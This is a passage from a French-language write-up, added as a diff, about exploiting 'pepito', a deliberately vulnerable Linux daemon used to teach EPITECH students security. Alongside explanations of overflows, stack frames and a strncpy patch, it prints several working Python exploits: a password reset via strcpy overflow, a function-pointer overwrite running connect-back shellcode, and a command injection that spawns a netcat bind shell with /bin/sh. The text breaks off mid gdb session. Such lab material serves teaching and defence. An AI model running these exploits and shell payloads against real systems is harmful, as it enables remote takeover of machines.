@@ -1,0 +1,4138 @@
+
+______           _ _             _____  _____  __   __
+| ___ \         (_) |           / __  \|  _  |/  | /  |
+| |_/ /___ _ __  _| |_  ___     `' / /'| |/' |`| | `| |
+|  __// _ \ '_ \| | __|/ _ \      / /  |  /| | | |  | |
+| |  |  __/ |_) | | |_| (_) |   ./ /___\ |_/ /_| |__| |_
+\_|   \___| .__/|_|\__|\___/    \_____/ \___/ \___/\___/
+          | |Linux/x86              For fun and Profit
+          |_|
+
+                _              ______ _
+               | |             |  _  (_)
+               |E|__  _   _    | | | |_  ___
+               |S'_ \| | | |   | | | |/ _ \
+               |L|_) | |_| |   | |/ /| | (_) |
+               |_.__/ \__, |   |___/ | |\___/
+                       __/ |        _/ |
+                      |___/        |__/
+
+
+
+
+______________________________________
+01 - Qu'est-ce que le projet pepito ? \________________________________________
+
+
+Le projet pepito est un projet proposé aux étudiants de première année à EPITECH
+pour les initier au monde de la sécurité informatique.
+
+Le projet est un deamon qui tourne sous linux x86 32 bits et qui est constitué
+de plusieurs vulnérabilités (Buffer Stack/Heap overflow, system(), format string)
+
+Le but du projet est donc de pousser les étudiants à repérer les vulnérabilités
+puis de les patcher et, si possible, les exploiter.
+
+
+
+_______________________________
+02 - Introduction aux overlows \_______________________________________________
+
+
+Le dépassement de mémoire tampon, aussi appelé buffer overflow, est un bug provo-
+quant un dépassement de la mémoire allouée à un programme. Lors de l'écriture, si
+un programme écrit en dehors de la mémoire qui lui a été allouée, cela ren-
+drait le comportement du programme instable.
+
+Dans le cas où ce buffer overflow est intentionnel et provoqué par l'utilisateur,
+il pourra faire exécuter tous types d'actions à l'ordinateur et s'en servir pour
+contourner les systemes de sécurité mis en place.
+
+
+L'exploitation d'un buffer overflow peut être dévastateur pour la sécurité d'une
+machine. Cela permettrait d'exécuter n'importe quel code arbitraire et une person-
+ne mal intentionnée pourrait s'ouvrir un shell à distance et prendre le contrôle
+de la machine.
+
+Les risques engendrés par un BOF sont d'autant plus grands que n'importe quel pro-
+gramme peut être touché, certaines fonctions utilisées en C peuvent entraîner des
+BOF tels que strcpy(), sprintf, scanf().
+
+Certains Antivirus comme AVAST ou BitDefender se sont avérés être faillibles en-
+traînant une possible exploitation par tous types de personnes ayant un accès phy-
+sique à un ordinateur utilisant un de ces logiciels.
+
+
+_____________________________________
+03 - Petito des vulns ? Mais où ça ! \_________________________________________
+
+
+
+###################################### handlerAddToGuestBook #####################################
+
+La première vulnérabilité sur laquelle on va travailler, c'est le buffer overflow
+se trouvant dans la fonction handlerAddToGuestBook() qui est située sur le tas.
+
+
+	[code]
+	static char	       	guestBook[512] = "##################################";
+	static char		password[512] = "";
+
+	int			handlerAddToGuestBook(void *packetPtr, size_t packetSize)
+	{
+	  char			*msg;
+
+	  if ((msg = getStr(&packetPtr, &packetSize))) {
+	    strcpy(guestBook, msg);
+	    sendLogMessage(AD_CHANGE);
+	    free(msg);
+	  }
+	  return (0);
+	}
+	[/code]
+
+
+La vulnérabilité ici est due au strcpy qui ne contrôle pas la taille de msg et
+qui copie le tout dans guestbook.
+
+Ce qui signifie que si la taille de msg dépasse les 512 octets nous allons
+écrire sur le tableau password et si on continue, il nous serait possible d'écraser
+d'autres données très importantes.
+
+C'est ce que nous allons voir dans la série d'exploitation qui suit.
+
+Une des premières vulnérabilités ici est qu'il est possible de réinitialiser le password
+mis en place par l'administrateur de ce service, vu que la fonction handlerAddToGuestBook
+peut être appelée par n'importe quel utilisateur.
+
+Schéma de l'exploitation:
+-------------------------
+
+<--------------- guestbook 512 bytes -------------> <------ password 512 bytes ----->
+[#|#|#|#|#|#|#|#|#|#|#|#|#|#|#|#|#| | | | | | | | ] [k|s|w|o|l|i|u|d|s|c| | | | | | ]
+
+
+Si nous remplissons le tableau guestbook de 512 octets, le strcpy va nous placer le \0
+sur la première case du tableau password ('k') et donc rendre le tableau password non
+initialisé. On pourra, par la suite, ajouter un nouveau password.
+
+
+Proof of Concept
+----------------
+
+ # Exploit: Sur toute architecture et OS
+ # Sécu   : Fonctionne avec toutes les sécuritées (Sauf la SSP)
+
+
+	[exploit]
+	#!/usr/bin/env python2
+	# sploit le strcpy pour depasser sur le tableau password
+
+	# (gdb)$ set follow-fork-mode child
+	# (gdb)$ b *0x08048c88
+	# Breakpoint 1 at 0x8048c88: file main.c, line 75.
+	# (gdb)$ r start
+	# Starting program: /home/jonathan/all/ESL/pepito-2011/src/pepito_jo/pepito start
+	# [New process 3032]
+	# Daemon started
+	# Advertisement successfully changed
+	# [Switching to process 3032]
+	#
+	# Breakpoint 1, 0x08048c88 in handlerAddToGuestBook (packetPtr=0xbfffe9a8,
+        # packetSize=0) at main.c:75
+	# 75 }
+	# (gdb)$ x/s 0x804ac00
+	# 0x804ac00 <password>:	 "djo"
+	# (gdb)$
+
+	import socket
+	import os
+	import time
+	import sys
+
+	if len(sys.argv) != 3:
+	   print "[-] Syntax: ./sploit.py <ip_victime> <port>"
+	   sys.exit(1)
+
+	try:
+	   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	   connect = s.connect((sys.argv[1], int(sys.argv[2])))
+	except:
+	   print "[-] Error connexion"
+	   sys.exit(1)
+
+	newpasswd = "\x00"
+	guestBook = "A" * 511
+	cmdID     = "1"
+	arg2      = str(len(guestBook) + len(newpasswd) + 1)
+	payload   = cmdID + " " + arg2 + " " + guestBook + newpasswd
+
+	print "[+] Try to reste null passwd"
+	try:
+	   s.send(payload)
+	   s.close
+	except:
+	   print "[-] Error send payload1"
+	   sys.exit(1)
+
+	print "[+] passwd is (null)"
+
+	time.sleep(1)
+
+	try:
+	   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	   connect = s.connect((sys.argv[1], int(sys.argv[2])))
+	except:
+	   print "[-] Error connexion"
+	   sys.exit(1)
+
+	newpasswd = "djo"
+	cmdID     = "0"
+	arg2      = str(len(newpasswd) + 1)
+	payload   = cmdID + " " + arg2 + " " + newpasswd
+
+	print "[+] Try to set a new password"
+	try:
+	   s.send(payload)
+	   s.close
+	except:
+	   print "[-] Error send payload2"
+	   sys.exit(1)
+
+	print "[+] The new password is now \"djo\""
+	[/exploit]
+
+
+
+Voici la première utilisation de cette vulnérabilité, mais on ne va pas
+s'arrêter ici car il nous est possible de faire des choses bien plus "fun"
+en exploitant cette dernière.
+
+Le but premier d'une exploitation est d'avoir la main sur le serveur. C'est
+ce que nous allons faire en montrant qu'il nous est possible de bypasser plusieurs
+sécurités.
+
+
+Schéma de l'exploitation:
+-------------------------
+
+ Sur les Fedoras STD, les sécurités mises en place sont l'ASLR, NX, et l'ASCII-ARMOR
+ ce qui signifie qu'il nous est impossible d'executer un shellcode sur la stack.
+
+ Pour bypasser NX, il nous est possible de faire du ret2libc, mais cette technique
+ est à exclure car l'ASCII-ARMOR positionne des NULL Bytes sur nos poids forts des
+ adresses de la fonction dans la libc.
+
+ Donc, ce que nous allons faire, s'est placer notre shellcode dans la section .data à
+ des adresses qui sont fixes. Pour cela, nous avons la capacité de placer 1024 octets
+ de codes arbitraires, ce qui nous suffira amplement.
+
+
+ Comment exécuter le code qui sera placé dans la section data ? Les développeurs nous on
+ laissé une belle faille, notre tableau de pointeur sur fonction se trouvant aussi dans
+ la section .data, il nous est donc possible de l'écraser et de rediriger les pointeurs
+ sur des fonctions choisies pas nos soins.
+
+
+ Regardons les adresses avec objdump
+ -----------------------------------
+
+	  $> objdump -x pepito | grep guestBook
+	  0804aa80 l     O .data	00000200              guestBook
+
+	  $> objdump -x pepito | grep password
+	  0804ac80 l     O .data	00000200              password
+
+	  $>objdump -x pepito | grep handlerTab
+	  0804ae80 l     O .data	00000014              handlerTab
+
+
+
+ Comment tout cela est constitué ?:
+ ----------------------------------
+
+      512          512    <-------------------- handlerTab ---------------------->
+ [ guestbook ] [password] [0x08048bca 0x08048c77 0x08048d91 0x08048d33 0x00000000]
+ ^             ^          ^
+ 0804aa80      0804ac80   0804ae80
+
+ Avec gdb on peut vérifier que les adresses du tableau handlerTab pointe bien sur nos fonctions.
+
+
+ (gdb)$ disass 0x08048bca
+ Dump of assembler code for function handlerChangePassword:
+   0x08048bca <+0>:	push   %ebp
+   0x08048bcb <+1>:	mov    %esp,%ebp
+   [...]
+
+ (gdb)$ disass 0x08048c77
+ Dump of assembler code for function handlerAddToGuestBook:
+   0x08048c77 <+0>:	push   %ebp
+   0x08048c78 <+1>:	mov    %esp,%ebp
+   [...]
+
+ (gdb)$ disass 0x08048d91
+ Dump of assembler code for function handlerShowGuestBook:
+   0x08048d91 <+0>:	push   %ebp
+   0x08048d92 <+1>:	mov    %esp,%ebp
+   [...]
+
+ (gdb)$ disass 0x08048d33
+ Dump of assembler code for function handlerUpdateLastVisit:
+   0x08048d33 <+0>:	push   %ebp
+   0x08048d34 <+1>:	mov    %esp,%ebp
+   [...]
+
+
+ Donc ici, clairement, nous allons placer notre shellcode dans le tableau guestbook puis continuer à
+ écrire pour écraser le tableau password et écrire dans handlertab pour faire pointer une fonction sur
+ notre shellcode.
+
+
+ Proof of concept
+ ----------------
+
+ # Exploit: Linux x86 32 bits
+ # Sécu   : Fonctionne avec toutes les sécurités (Sauf la SSP)
+
+	[sploit]
+	#!/usr/bin/env python2
+	# sploit le strcpy pour dépasser sur le tableau guestBook et password pour atteindre
+	# le tableau de pointeur sur fonction handlerTab
+
+	# $>objdump -x ../../../src/pepito_jo/pepito | grep handlerTab
+	# 0804ae80 l     O .data	00000014              handlerTab
+	# $> objdump -x ../../../src/pepito_jo/pepito | grep password
+	# 0804ac80 l     O .data	00000200              password
+	# $> objdump -x ../../../src/pepito_jo/pepito | grep guestBook
+	# 0804aa80 l     O .data	00000200              guestBook
+
+	# Nous avons en premier notre tableau guestBook, ensuite notre tableau de password,
+	# puis nous écrasons le tableau handlerTab
+
+	# Constitution du tableau handlerTab
+	# +====================================================================
+	# | 804ae80
+	# | .......   ;********************************************************
+	# | .......   ; data object handlerTab, size 20 (local)
+	# | .......   ;********************************************************
+	# | .......   handlerTab:                     ;xref r8048e77
+	# | .......     dd          08048bcah
+	# | 804ae84     db          77h ; 'w'
+	# | 804ae85     db          8ch ; '?'
+	# | 804ae86     db          04h ; ' '
+	# | 804ae87     db          08h ; ' '
+	# | 804ae88     db          91h ; '?'
+	# | 804ae89     db          8dh ; '?'
+	# | 804ae8a     db          04h ; ' '
+	# | 804ae8b     db          08h ; ' '
+	# | 804ae8c     db          33h ; '3'
+	# | 804ae8d     db          8dh ; '?'
+	# | 804ae8e     db          04h ; ' '
+	# | 804ae8f     db          08h ; ' '
+	# | 804ae90     db          00h ; ' '
+	# | 804ae91     db          00h ; ' '
+	# | 804ae92     db          00h ; ' '
+	# | 804ae93     db          00h ; ' '
+
+	import socket
+	import os
+	import time
+	import sys
+
+	if len(sys.argv) != 2:
+	   print "[-] Syntax: ./sploit.py <ip_victime> <port>"
+	   sys.exit(1)
+
+	try:
+	   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	   connect = s.connect((sys.argv[1], int(sys.argv[2])))
+	except:
+	   print "[-] Error connexion"
+	   sys.exit(1)
+
+	# connect back 192.168.1.11:8080
+	# nc -l -vvv -p 8080
+	shellcode = "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80" \
+		    "\x5b\x5e\x68\xc0\xa8\x01\x0b\x66\x68\x1f\x90\x66\x53\x6a\x10" \
+		    "\x51\x50\x89\xe1\x43\x6a\x66\x58\xcd\x80\x59\x87\xd9\xb0\x3f" \
+		    "\xcd\x80\x49\x79\xf9\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69" \
+		    "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+
+	password   = shellcode
+	size       = len(shellcode)
+	password  += "\x90" * (512 - size)
+	guestBook  = "A" * 512
+
+	handlerTab = "\x80\xac\x04\x08" # EIP 0x0804ac80 => password
+	cmdID      = "1"
+	arg2       = str(len(guestBook) + len(password) + len(handlerTab) + 1)
+	payload    = cmdID + " " + arg2 + guestBook + password + handlerTab
+
+	print "[+] Try to send payload"
+	try:
+	   s.send(payload)
+	   s.close
+	except:
+	   print "[-] Error send payload1"
+	   sys.exit(1)
+
+	print "[+] .data overwrited!"
+	print "[+] run a terminal for catch reverse TCP"
+	os.system("gnome-terminal -e \"nc -l -vvv -p 8080\"")
+	time.sleep(2)
+	print "[+] Execute payload in server"
+
+	try:
+	   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	   connect = s.connect((sys.argv[1], int(sys.argv[2])))
+	except:
+	   print "[-] Error connexion"
+	   sys.exit(1)
+
+	try:
+	   s.send("0 5 pown")
+	   s.close
+	except:
+	   print "[-] Error send payload1"
+	   sys.exit(1)
+	[/sploit]
+
+
+ Ici le sploit fait du reverse TCP.
+ Le shellcode étant placé dans la .data sur des adresses fixes, qui ne sont donc pas
+ influencables par l'ASLR.
+
+
+ Pour le "fun", j'ai fait un petit sploit tryki qui recréé une vraie fonction avec son
+ prologue et son épilogue et qui renvoie shell-storm.org sur le socket.
+
+ La video de l'exploit est disponible sur internet à cette adresse.
+ http://www.shell-storm.org/pepito.ogv
+
+ L'exploit est celui-ci:
+
+ # Exploit: Linux x86 32 bits
+ # Sécu   : Fonctionne avec toutes les sécurités (Sauf la SSP)
+
+	[sploit]
+	#!/usr/bin/env python2
+
+	import socket
+	import os
+	import time
+	import sys
+
+	if len(sys.argv) != 3:
+	   print "[-] Syntax: ./sploit.py <ip_victime> <port>"
+	   sys.exit(1)
+
+	try:
+	   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	   connect = s.connect((sys.argv[1], int(sys.argv[2])))
+	except:
+	   print "[-] Error connexion"
+	   sys.exit(1)
+
+	# 08048054 <.text>:
+	# 8048054:	55                   	push   %ebp
+	# 8048055:	89 e5                	mov    %esp,%ebp
+	# 8048057:	31 c0                	xor    %eax,%eax
+	# 8048059:	31 db                	xor    %ebx,%ebx
+	# 804805b:	31 c9                	xor    %ecx,%ecx
+	# 804805d:	31 d2                	xor    %edx,%edx
+	# 804805f:	b2 10                	mov    $0x10,%dl
+	# 8048061:	68 6f 72 67 0a       	push   $0x0a67726f
+	# 8048066:	68 6f 72 6d 2e       	push   $0x2e6d726f
+	# 804806b:	68 6e 2d 73 74       	push   $0x74732d6c
+	# 8048070:	68 73 68 65 6e       	push   $0x6c656873
+	# 8048075:	89 e1                	mov    %esp,%ecx
+	# 8048077:	b3 01                	mov    $0x1,%bl
+	# 8048079:	b0 04                	mov    $0x4,%al
+	# 804807b:	cd 80                	int    $0x80
+	# 804807d:	c9                   	leave
+	# 804807e:	c3                   	ret
+
+	shellcode = "\x55\x89\xe5\x31\xc0\x31\xdb\x31\xc9\x31\xd2" \
+		    "\xb2\x10\x68\x6f\x72\x67\x0a\x68\x6f\x72\x6d" \
+		    "\x2e\x68\x6c\x2d\x73\x74\x68\x73\x68\x65\x6c" \
+		    "\x89\xe1\xb3\x04\xb0\x04\xcd\x80\xc9\xc3"
+
+	password    = shellcode
+	size        = len(shellcode)
+	password   += "\x90" * (512 - size)
+	guestBook   = "A" * 512
+	handlerTab  = "\x80\xac\x04\x08" # tab[0]
+	handlerTab += "\x80\xac\x04\x08" # tab[1]
+	handlerTab += "\x80\xac\x04\x08" # tab[2]
+	handlerTab += "\x80\xac\x04\x08" # tab[3]
+	cmdID       = "1"
+	arg2        = str(len(guestBook) + len(password) + len(handlerTab) + 1)
+	payload     = cmdID + " " + arg2 + guestBook + password + handlerTab
+
+	print "[+] Try to send payload"
+	try:
+	   s.send(payload)
+	   s.close
+	except:
+	   print "[-] Error send payload1"
+	   sys.exit(1)
+
+	print "[+] binary patched!"
+	sys.exit(0)
+	[/sploit]
+
+
+Je pense que cela suffit pour l'exploitation de cette vulnérabilité.
+Pour patcher cette faille, il nous suffit juste de limiter la taille de copy:
+
+	[patch]
+	--- pepito_jo/main.c	2011-03-29 12:19:16.000000000 +0200
+	+++ pepito_jo_patched//main.c	2011-03-29 15:42:56.000000000 +0200
+	@@ -67,7 +67,7 @@
+	   char			*msg;
+
+	   if ((msg = getStr(&packetPtr, &packetSize))) {
+	-    strcpy(guestBook, msg);
+	+    strncpy(guestBook, msg, sizeof(guestBook) - 1);
+	     sendLogMessage(AD_CHANGE);
+	     free(msg);
+	   }
+	[/patch]
+
+###################################### handlerAddToGuestBook #####################################
+
+
+###################################### handlerUpdateLastVisit ####################################
+
+
+Dans cette fonction, la vulnérabilité est l'appel à la fonction system().
+System() permet d'exécuter une commande sur la machine locale sans spécifier le PATH.
+
+Il nous est donc possible d'enchaîner les commandes par des ';'
+
+
+	int			updateBuf(char *buf, void *packetPtr, size_t packetSize)
+	{
+	  char			*name = NULL;
+
+	  if ((name = getStr(&packetPtr, &packetSize))) {
+	    if (sprintf(buf, "touch lastvisit_%s\n", name) >= 512)
+	      return (1);
+	    free(name);
+	    return (0);
+	  }
+	  return (1);
+	}
+
+	int			handlerUpdateLastVisit(void *packetPtr, size_t packetSize)
+	{
+	  char			buf[512] = {0};
+
+	  if (!updateBuf(buf, packetPtr, packetSize))
+	    system(buf);
+	  return (0);
+	}
+
+Ici, nous allons copier "touch lastvisit_`argv_soket`" dans buf puis faire un system(buf)
+
+Si on envoie "djo" sur le socket, la commande sera "touch lastvisit_djo". Par contre, si
+on envoie "djo;id" la commande sera "touch lastvisit_djo;id"
+
+Dans ce dernier cas, system() exécutera "touch lastvisit_djo" puis ensuite "id".
+
+Le but ici est donc d'expoiter cette vulnérabilité pour nous ouvrir un remote shell.
+
+ # Exploit: Sur toute architecture et OS
+ # Sécu   : Fonctionne avec toutes les sécurités
+
+	[sploit]
+	#!/usr/bin/env python2
+	# sploit qui utilise la vuln system pour ouvrir un shell
+
+	import socket
+	import os
+	import time
+	import sys
+
+	if len(sys.argv) != 3:
+	   print "[-] Syntax: ./sploit.py <ip_victime> <port>"
+	   sys.exit(1)
+
+	try:
+	   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	   connect = s.connect((sys.argv[1], int(sys.argv[2])))
+	except:
+	   print "[-] Error connexion"
+	   sys.exit(1)
+
+
+	evil  = ";nc -nvv -l -p 1234 -e /bin/sh"
+	cmdID = "3 "
+	arg3  = " pown"+evil
+	arg2  = str(len(arg3))
+	payload = cmdID + arg2 + arg3
+
+	print "[+] Send payload..."
+	try:
+	   s.send(payload)
+	   s.close
+	except:
+	   print "[-] Error send payload"
+	   sys.exit(1)
+	print "[+] done!"
+	print "[+] Waiting backdoor"
+	time.sleep(3)
+	concat = "netcat " + sys.argv[1] + " 1234"
+	print "[+] Connected to the backdoor you can now execute cmd"
+	os.system(concat)
+	[/sploit]
+
+
+Dans cette fonction il existe une deuxième vulnérabilité plus intéressante à exploiter.
+Il y a un stack buffer overflow sur le tableau buf.
+
+Ce tableau étant d'une taille de 512 octets et rempli par sprintf qui ne vérifie pas
+la taille copiée, il nous est donc possible d'écrire sur la pile et d'écraser le "saved eip"
+qui est pusher sur la stack dans la fonction updateBuf
+
+
+
+Un petit point sur pourquoi un programme Segfault lors d'un Buffer Overflow
+===========================================================================
+
+
+Plusieurs petites choses à savoir, %eip est le registre qui contient l'adresse de la prochaine
+instruction à executer, %ebp est le registre qui contient l'adresse basse de la stack et %esp
+contient l'adresse haute de la stack.
+
+Ensuite, le prologue et l'épilogue sont des instructions utilisées à chaque début et fin d'une
+fonction pour sauvgarder l'état de l'ancienne pile et la restaurer lors du return.
+
+
+Le prologue est constitué comme ceci:
+
+	 push %ebp
+	 mov %esp, %ebp
+
+L'épilogue, quant à lui, est constitué comme cela :
+
+	leave    ou     mov %ebp, %esp
+	ret             pop %ebp
+                        ret
+
+
+Généralement suivi du prologue, nous avons un "sub $XX, %esp" , ce qui permet d'allouer
+assez d'espace sur la stack pour traiter des données temporaires.
+
+
+Petit exemple pratique avec gdb:
+
+	[code]
+	int foo(void)
+	{
+	  puts("foo");
+	  return (18);
+	}
+
+	void main(void)
+	{
+	  puts("main");
+	  foo();
+	}
+	[code]
+
+	(gdb) disass main
+	Dump of assembler code for function main:
+                                                           | ETAT EIP |   | COMMENTAIRE |
+         +-------------------------------------------------+----------+---+-------------+
+	   0x080483bd <+0>:	push   %ebp                |0x080483be|    <= notre prologue
+	   0x080483be <+1>:	mov    %esp,%ebp           |0x080483c0|    <=      //
+                                                           |          |
+	   0x080483c0 <+3>:	sub    $0x4,%esp           |0x080483c3|    <= On aura besoin que
+                                                           |          |       de 4 octets
+	   0x080483c3 <+6>:	movl   $0x80484a4,(%esp)   |0x080483ca|    <= D'où le sub 0x4
+                                                           |          |    <= 0x80484a4 est l'adresse
+                                                           |          |       de la chaîne "main" dans
+                                                           |          |       la section .data qu'on
+                                                           |          |       va pusher sur la stack
+	   0x080483ca <+13>:	call   0x80482d4 <puts@plt>|0x080483cf|       pour le puts.
+	   0x080483cf <+18>:	call   0x80483a4 <foo>     |0x080483d4|
+	   0x080483d4 <+23>:	leave                      |0x080483d5|
+	   0x080483d5 <+24>:	ret
+	End of assembler dump.
+	(gdb)
+
+	Lors de l'appel à la fonction foo() (ligne 0x080483cf) le programme à besoin de connaître
+        l'adresse de la fonction qui suit le call. C'est pourquoi dans la fonction foo() le prologue
+        et l'épilogue nous permettent de revenir sur l'adresse (0x080483d4)
+
+
+	(gdb) disass foo
+	Dump of assembler code for function foo:
+	   0x080483a4 <+0>:	push   %ebp
+	   0x080483a5 <+1>:	mov    %esp,%ebp            <= On va breaker ici pour voir
+	   0x080483a7 <+3>:	sub    $0x4,%esp               ce qui se passe
+	   0x080483aa <+6>:	movl   $0x80484a0,(%esp)
+	   0x080483b1 <+13>:	call   0x80482d4 <puts@plt>
+	   0x080483b6 <+18>:	mov    $0x12,%eax
+	   0x080483bb <+23>:	leave
+	   0x080483bc <+24>:	ret                         <= pareil ici
+	End of assembler dump.
+	(gdb)
+
+
+	gdb$ b *0x080483a5                                  <= break sur prologue
+	Breakpoint 1 at 0x80483a5
+	gdb$ b *0x080483bc                                  <= break sur épilogue
+	Breakpoint 2 at 0x80483bc
+	gdb$ r
+	main
+	--------------------------------------------------------------------------[regs]
+	  EAX: 00000005  EBX: B7FB6FF4  ECX: B7FB8340
+	  EDX: 00000005  ESI: 00000000  EDI: 00000000
+	  EBP: BFFFF848  ESP: BFFFF83C  EIP: 080483A5
+
+	--------------------------------------------------------------------------[code]
+	=> 0x80483a5 <foo+1>:	mov    %esp,%ebp
+	   0x80483a7 <foo+3>:	sub    $0x4,%esp
+	   0x80483aa <foo+6>:	movl   $0x80484a0,(%esp)
+	   0x80483b1 <foo+13>:	call   0x80482d4 <puts@plt>
+	   0x80483b6 <foo+18>:	mov    $0x12,%eax
+	   0x80483bb <foo+23>:	leave
+	   0x80483bc <foo+24>:	ret
+	   0x80483bd <main>:	push   %ebp
+	--------------------------------------------------------------------------------
+
+	Breakpoint 1, 0x080483a5 in foo ()
+	gdb$ x/3x $esp                  +----------------------- Notre saved EIP est pushé sur
+                                        V                        la stack
+	0xbffff83c:	0xbffff848	0x080483d4	0x080484a4
+	gdb$ c
+	foo
+	--------------------------------------------------------------------------[regs]
+	  EAX: 00000012  EBX: B7FB6FF4  ECX: B7FB8340
+	  EDX: 00000004  ESI: 00000000  EDI: 00000000
+	  EBP: BFFFF848  ESP: BFFFF840  EIP: 080483BC
+
+	--------------------------------------------------------------------------[code]
+	=> 0x80483bc <foo+24>:	ret
+	   0x80483bd <main>:	push   %ebp
+	   0x80483be <main+1>:	mov    %esp,%ebp
+	   0x80483c0 <main+3>:	sub    $0x4,%esp
+	   0x80483c3 <main+6>:	movl   $0x80484a4,(%esp)
+	   0x80483ca <main+13>:	call   0x80482d4 <puts@plt>
+	   0x80483cf <main+18>:	call   0x80483a4 <foo>
+	   0x80483d4 <main+23>:	leave
+	--------------------------------------------------------------------------------
+
+	Breakpoint 2, 0x080483bc in foo ()
+	gdb$ x/3x $esp  +-------------------------------------- Saved EIP est prêt à être popé
+                        |                                       et donc nous retournons dans
+                        |                                       la fonction main
+                        V
+	0xbffff840:	0x080483d4	0x080484a4	0xbffff8c8
+	gdb$
+
+
+
+Typiquement, quand un un buffer Overflow a lieu, c'est le saved EIP qui est écrasé et donc lors
+du return, EIP va donc pointer sur une adresse inconnue et le programe segfaultera.
+
+
+Maintenant, regardons tout cela dans pepito.
+
+
+	jonathan@ArchLinux [pepito_jo] $ gdb ./pepito
+	GNU gdb (GDB) 7.2
+	Copyright (C) 2010 Free Software Foundation, Inc.
+	License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+	This is free software: you are free to change and redistribute it.
+	There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+	and "show warranty" for details.
+	This GDB was configured as "i686-pc-linux-gnu".
+	For bug reporting instructions, please see:
+	<http://www.gnu.org/software/gdb/bugs/>...
+	Reading symbols from /home/jonathan/all/ESL/pepito-2011/src/pepito_jo/pepito...done.
+	(gdb)$ disass handlerUpdateLastVisit
+	Dump of assembler code for function handlerUpdateLastVisit:
+	   0x08048d33 <+0>:	push   %ebp
+	   0x08048d34 <+1>:	mov    %esp,%ebp
+	   0x08048d36 <+3>:	push   %edi
+	   0x08048d37 <+4>:	push   %ebx
+	   0x08048d38 <+5>:	sub    $0x210,%esp
+	   0x08048d3e <+11>:	lea    -0x208(%ebp),%ebx
+	   0x08048d44 <+17>:	mov    $0x0,%eax
+	   0x08048d49 <+22>:	mov    $0x80,%edx
+	   0x08048d4e <+27>:	mov    %ebx,%edi
+	   0x08048d50 <+29>:	mov    %edx,%ecx
+	   0x08048d52 <+31>:	rep stos %eax,%es:(%edi)
+	   0x08048d54 <+33>:	mov    0xc(%ebp),%eax
+	   0x08048d57 <+36>:	mov    %eax,0x8(%esp)
+	   0x08048d5b <+40>:	mov    0x8(%ebp),%eax
+	   0x08048d5e <+43>:	mov    %eax,0x4(%esp)
+	   0x08048d62 <+47>:	lea    -0x208(%ebp),%eax
+	   0x08048d68 <+53>:	mov    %eax,(%esp)
+	   0x08048d6b <+56>:	call   0x8048cc9 <updateBuf>
+	   0x08048d70 <+61>:	test   %eax,%eax
+	   0x08048d72 <+63>:	jne    0x8048d82 <handlerUpdateLastVisit+79>
+	   0x08048d74 <+65>:	lea    -0x208(%ebp),%eax
+	   0x08048d7a <+71>:	mov    %eax,(%esp)
+	   0x08048d7d <+74>:	call   0x80488f8 <system@plt>
+	   0x08048d82 <+79>:	mov    $0x0,%eax
+	   0x08048d87 <+84>:	add    $0x210,%esp
+	   0x08048d8d <+90>:	pop    %ebx
+	   0x08048d8e <+91>:	pop    %edi
+	   0x08048d8f <+92>:	pop    %ebp
+	   0x08048d90 <+93>:	ret
+	End of assembler dump.
+	(gdb)$ b *0x08048d6b                                        <= break ici pour montrer
+                                                                       l'eip de la prochaine
+                                                                       instruction 0x08048d70
+	Breakpoint 1 at 0x8048d6b: file main.c, line 94.               au retour de la fonction
+	(gdb)$ disass updateBuf
+	Dump of assembler code for function updateBuf:
+	   0x08048cc9 <+0>:	push   %ebp
+	   0x08048cca <+1>:	mov    %esp,%ebp
+	   0x08048ccc <+3>:	sub    $0x28,%esp
+	   0x08048ccf <+6>:	movl   $0x0,-0xc(%ebp)
+	   0x08048cd6 <+13>:	lea    0x10(%ebp),%eax
+	   0x08048cd9 <+16>:	mov    %eax,0x4(%esp)
+	   0x08048cdd <+20>:	lea    0xc(%ebp),%eax
+	   0x08048ce0 <+23>:	mov    %eax,(%esp)
+	   0x08048ce3 <+26>:	call   0x8048fde <getStr>
+	   0x08048ce8 <+31>:	mov    %eax,-0xc(%ebp)
+	   0x08048ceb <+34>:	cmpl   $0x0,-0xc(%ebp)
+	   0x08048cef <+38>:	je     0x8048d2c <updateBuf+99>
+	   0x08048cf1 <+40>:	mov    $0x8049718,%eax
+	   0x08048cf6 <+45>:	mov    -0xc(%ebp),%edx
+	   0x08048cf9 <+48>:	mov    %edx,0x8(%esp)
+	   0x08048cfd <+52>:	mov    %eax,0x4(%esp)
+	   0x08048d01 <+56>:	mov    0x8(%ebp),%eax
+	   0x08048d04 <+59>:	mov    %eax,(%esp)
+	   0x08048d07 <+62>:	call   0x8048878 <sprintf@plt>
+	   0x08048d0c <+67>:	cmp    $0x1ff,%eax
+	   0x08048d11 <+72>:	jle    0x8048d1a <updateBuf+81>
+	   0x08048d13 <+74>:	mov    $0x1,%eax
+	   0x08048d18 <+79>:	jmp    0x8048d31 <updateBuf+104>
+	   0x08048d1a <+81>:	mov    -0xc(%ebp),%eax
+	   0x08048d1d <+84>:	mov    %eax,(%esp)
+	   0x08048d20 <+87>:	call   0x8048978 <free@plt>
+	   0x08048d25 <+92>:	mov    $0x0,%eax
+	   0x08048d2a <+97>:	jmp    0x8048d31 <updateBuf+104>
+	   0x08048d2c <+99>:	mov    $0x1,%eax
+	   0x08048d31 <+104>:	leave
+	   0x08048d32 <+105>:	ret
+	End of assembler dump.
+	(gdb)$ b *0x08048ccc                                          <= le prologue sauvegarde eip
+	Breakpoint 2 at 0x8048ccc: file main.c, line 78.
+	(gdb)$ b *0x08048d32                                          <= épilogue restaure eip
+	Breakpoint 3 at 0x8048d32: file main.c, line 88.
+	(gdb)$ set follow-fork-mode child
+	(gdb)$ r start
+	Starting program: /home/jonathan/all/ESL/pepito-2011/src/pepito_jo/pepito start
+	[New process 9909]
+	Daemon started
+	[Switching to process 9909]
+
+	Breakpoint 1, 0x08048d6b in handlerUpdateLastVisit (packetPtr=0xbfffe7a1,
+	    packetSize=513) at main.c:94
+	94	  if (!updateBuf(buf, packetPtr, packetSize))
+	(gdb)$ c
+	Continuing.
+	[tcsetpgrp failed in terminal_inferior: No such process]
+
+	Breakpoint 2, 0x08048ccc in updateBuf (buf=0xbfffe530 "",
